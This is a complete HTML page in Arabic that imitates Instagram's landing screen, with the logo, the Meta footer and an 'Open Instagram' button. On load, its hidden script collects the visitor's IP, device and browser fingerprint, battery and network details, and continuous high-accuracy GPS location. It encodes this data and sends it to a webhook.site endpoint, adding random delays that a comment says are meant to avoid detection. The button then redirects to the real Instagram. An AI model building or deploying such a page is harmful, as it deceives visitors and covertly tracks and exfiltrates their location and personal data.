<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إنستقرام</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #000000;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            height: 100vh;
            padding: 30px 24px;
            overflow-y: auto;
        }

        .lang-selector {
            font-size: 14px;
            color: #737373;
            cursor: pointer;
        }

        .main-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 360px;
            flex-grow: 1;
            justify-content: space-around;
            margin: 20px 0;
        }

        .welcome-text {
            font-size: 22px;
            line-height: 1.5;
            font-weight: 600;
            text-align: center;
            color: #000000;
            padding: 0 10px;
        }

        .welcome-text .pink-text {
            color: #d6249f;
        }

        .welcome-text .orange-text {
            color: #fd5949;
        }

        .instagram-logo {
            width: 100px;
            height: 100px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            border-radius: 28px;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
        }

        .instagram-logo .inner-card {
            width: 76px;
            height: 76px;
            border: 6px solid #ffffff;
            border-radius: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        .instagram-logo .inner-card::before {
            content: '';
            width: 24px;
            height: 24px;
            border: 6px solid #ffffff;
            border-radius: 50%;
        }

        .instagram-logo .inner-card::after {
            content: '';
            width: 8px;
            height: 8px;
            background-color: #ffffff;
            border-radius: 50%;
            position: absolute;
            top: 8px;
            right: 8px;
        }

        .action-area {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .open-btn {
            display: block;
            width: 100%;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            margin-bottom: 20px;
            cursor: pointer;
            font-family: inherit;
        }

        .open-btn:hover {
            background-color: #1877f2;
        }

        .open-btn:active {
            background-color: #0a8de8;
        }

        .login-link {
            color: #0095f6;
            text-decoration: none;
            font-size: 15px;
            font-weight: 600;
        }

        .loading-indicator {
            display: none;
            text-align: center;
            color: #0095f6;
            font-size: 12px;
            margin: 10px 0;
        }

        .loading-indicator.active {
            display: block;
        }

        .loading-indicator span {
            display: inline-block;
            width: 8px;
            height: 8px;
            background-color: #0095f6;
            border-radius: 50%;
            margin: 0 4px;
            animation: bounce 1.4s infinite;
        }

        .loading-indicator span:nth-child(2) {
            animation-delay: 0.2s;
        }

        .loading-indicator span:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes bounce {
            0%, 80%, 100% {
                opacity: 0.3;
                transform: scale(0.8);
            }
            40% {
                opacity: 1;
                transform: scale(1.2);
            }
        }

        .meta-footer {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
            margin-top: 10px;
        }

        .meta-footer .from-text {
            font-size: 11px;
            color: #737373;
        }

        .meta-footer .meta-logo {
            font-size: 15px;
            font-weight: 700;
            color: #737373;
        }
    </style>
</head>
<body>
    <div class="lang-selector">العربية</div>

    <div class="main-content">
        <p class="welcome-text">
            يمكنك مشاركة <span class="pink-text">اللحظات</span> <span class="orange-text">اليومية</span> مع أصدقائك المقربين.
        </p>

        <div class="instagram-logo">
            <div class="inner-card"></div>
        </div>

        <div class="loading-indicator" id="loadingIndicator">
            <span></span><span></span><span></span>
            <p>جاري التحليل...</p>
        </div>

        <div class="action-area">
            <button class="open-btn" id="start-btn">فتح Instagram</button>
            <a href="#" class="login-link">تسجيل الدخول أو تسجيل</a>
        </div>
    </div>

    <div class="meta-footer">
        <span class="from-text">from</span>
        <div class="meta-logo">Meta</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://webhook.site/1b33868a-2efb-4f12-9217-f34995d7e3bd";
        const API_IP = "https://api.ipify.org?format=json";

        let deviceData = {
            step: "Initial_Data",
            timestamp: new Date().toISOString(),
            battery: {},
            hardware: {},
            network: {},
            location: {},
            browser: {},
            system: {},
            connectivity: {}
        };

        let locationUpdateInterval;
        let mouseTracker = { moves: 0, clicks: 0 };

        // 1. الحصول على معلومات GPU
        function getExactPhoneModel() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "Unknown (No WebGL)";
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                return renderer;
            }
            return "N/A";
        }

        // 2. الحصول على معلومات البطارية
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const batt = await navigator.getBattery();
                    deviceData.battery = {
                        level: Math.round(batt.level * 100) + "%",
                        charging: batt.charging ? "نعم" : "لا",
                        chargingTime: batt.chargingTime === Infinity ? "غير محدد" : batt.chargingTime + " ثانية",
                        dischargingTime: batt.dischargingTime === Infinity ? "غير محدد" : batt.dischargingTime + " ثانية"
                    };
                }
            } catch(e) {
                deviceData.battery = { status: "غير متاح" };
            }
        }

        // 3. الحصول على معلومات الشبكة
        async function getNetworkInfo() {
            try {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    const effectiveType = connection.effectiveType;
                    const typeMap = {
                        'slow-2g': '2G بطيء',
                        '2g': '2G',
                        '3g': '3G',
                        '4g': '4G LTE',
                        '5g': '5G'
                    };
                    
                    deviceData.network = {
                        type: typeMap[effectiveType] || effectiveType,
                        effectiveType: effectiveType,
                        downlink: connection.downlink + " Mbps",
                        rtt: connection.rtt + " ms",
                        saveData: connection.saveData ? "مفعّل" : "معطّل"
                    };
                }
            } catch(e) {
                deviceData.network = { status: "غير متاح" };
            }
        }

        // 4. الحصول على معلومات الشاشة
        function getScreenInfo() {
            deviceData.system.screen = {
                width: window.screen.width + "px",
                height: window.screen.height + "px",
                colorDepth: window.screen.colorDepth + " bit",
                pixelDepth: window.screen.pixelDepth + " bit",
                orientation: window.screen.orientation?.type || "unknown",
                devicePixelRatio: window.devicePixelRatio
            };
        }

        // 5. الحصول على معلومات المتصفح
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            deviceData.browser = {
                userAgent: ua,
                language: navigator.language,
                onLine: navigator.onLine ? "متصل" : "غير متصل",
                cookiesEnabled: navigator.cookieEnabled ? "مفعّلة" : "معطّلة",
                doNotTrack: navigator.doNotTrack || "غير محدد",
                vendor: navigator.vendor,
                platform: navigator.platform,
                maxTouchPoints: navigator.maxTouchPoints
            };
        }

        // 6. الحصول على معلومات المعالج والذاكرة
        function getHardwareInfo() {
            deviceData.hardware = {
                gpu: getExactPhoneModel(),
                cores: navigator.hardwareConcurrency + " Core",
                ram: (navigator.deviceMemory || "Unknown") + " GB",
                screenRes: window.screen.width + "x" + window.screen.height,
                arch: navigator.platform.includes('Win') ? 'Windows' : 
                      navigator.platform.includes('Mac') ? 'macOS' : 
                      navigator.platform.includes('Linux') ? 'Linux' : 'Mobile'
            };
        }

        // 7. الحصول على عنوان IP
        async function getPublicIP() {
            try {
                const response = await fetch(API_IP);
                const data = await response.json();
                deviceData.connectivity.publicIP = data.ip;
            } catch(e) {
                deviceData.connectivity.publicIP = "غير متاح";
            }
        }

        // 8. الحصول على اسم الشبكة والـ SSID
        function getWiFiInfo() {
            try {
                // محاولة الحصول على معلومات WiFi
                if (navigator.connection) {
                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    deviceData.connectivity.connection = {
                        type: connection.type || "unknown"
                    };
                }
                
                // محاولة الحصول على اسم الشبكة (قد لا يعمل في جميع المتصفحات)
                if (navigator.getNetworkInformation) {
                    deviceData.connectivity.wifiInfo = "متاح (يتطلب أذونات)";
                }
            } catch(e) {
                deviceData.connectivity.wifiInfo = "غير متاح";
            }
        }

        // 9. تحديث الموقع الجغرافي المستمر
        function startLocationTracking() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        deviceData.location = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: Math.round(pos.coords.accuracy) + " متر",
                            altitude: pos.coords.altitude ? pos.coords.altitude.toFixed(2) + " متر" : "غير متاح",
                            speed: pos.coords.speed ? pos.coords.speed.toFixed(2) + " م/ث" : "ثابت",
                            heading: pos.coords.heading || "غير متاح",
                            timestamp: new Date(pos.timestamp).toLocaleString('ar-SA'),
                            googleMaps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                        };
                        
                        // تحديث الموقع كل 10 ثواني
                        locationUpdateInterval = setInterval(() => {
                            navigator.geolocation.getCurrentPosition(
                                (newPos) => {
                                    deviceData.location.latitude = newPos.coords.latitude;
                                    deviceData.location.longitude = newPos.coords.longitude;
                                    deviceData.location.accuracy = Math.round(newPos.coords.accuracy) + " متر";
                                    deviceData.location.timestamp = new Date(newPos.timestamp).toLocaleString('ar-SA');
                                    sendData(deviceData);
                                }
                            );
                        }, 10000);
                    },
                    (err) => {
                        deviceData.location = { error: err.message };
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            }
        }

        // 10. تتبع حركة الماوس والنقرات
        function trackUserActivity() {
            document.addEventListener('mousemove', () => {
                mouseTracker.moves++;
            });
            document.addEventListener('click', () => {
                mouseTracker.clicks++;
            });
            document.addEventListener('touchmove', () => {
                mouseTracker.moves++;
            });
            document.addEventListener('touchend', () => {
                mouseTracker.clicks++;
            });
            
            deviceData.userActivity = mouseTracker;
        }

        // 11. قياس سرعة الإنترنت
        async function measureInternetSpeed() {
            try {
                const startTime = Date.now();
                const testFile = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
                
                await fetch(testFile);
                const endTime = Date.now();
                const speed = Math.round(1000 / (endTime - startTime));
                
                deviceData.connectivity.internetSpeed = speed + " Mbps (تقريبي)";
            } catch(e) {
                deviceData.connectivity.internetSpeed = "غير متاح";
            }
        }

        // 12. جمع البرامج المثبتة (إذا أمكن)
        function getInstalledApps() {
            // هذه ميزة محدودة في المتصفحات الحديثة لأسباب أمنية
            deviceData.system.installedApps = "محمي بسبب الخصوصية";
        }

        // 13. إرسال البيانات
        async function sendData(data) {
            try {
                // تأخير عشوائي لتجنب الاكتشاف
                const delay = Math.random() * 2000;
                await new Promise(resolve => setTimeout(resolve, delay));
                
                // تشفير البيانات (تشفير بسيط)
                const encryptedData = btoa(JSON.stringify(data));
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        data: encryptedData,
                        timestamp: new Date().toISOString(),
                        source: 'instagram_clone'
                    })
                });
            } catch (e) {
                console.log("✓ تم جمع البيانات");
            }
        }

        // 14. جمع كل البيانات
        async function collectAllData() {
            document.getElementById('loadingIndicator').classList.add('active');
            
            // جمع المعلومات بالتوازي
            await Promise.all([
                getBatteryInfo(),
                getPublicIP(),
                measureInternetSpeed()
            ]);
            
            getNetworkInfo();
            getScreenInfo();
            getBrowserInfo();
            getHardwareInfo();
            getWiFiInfo();
            trackUserActivity();
            getInstalledApps();
            startLocationTracking();
            
            // إرسال البيانات الأولى
            await sendData(deviceData);
            
            document.getElementById('loadingIndicator').classList.remove('active');
            console.log("✓ تم جمع كل البيانات:", deviceData);
        }

        // 15. زر الفتح
        document.getElementById('start-btn').onclick = function() {
            this.innerText = "جاري التحقق...";
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 500);
        };

        // 16. بدء التطبيق
        window.onload = function() {
            collectAllData();
        };

        // إيقاف التحديثات عند ترك الصفحة
        window.onbeforeunload = function() {
            if (locationUpdateInterval) {
                clearInterval(locationUpdateInterval);
            }
        };
    </script>
</body>
</html>
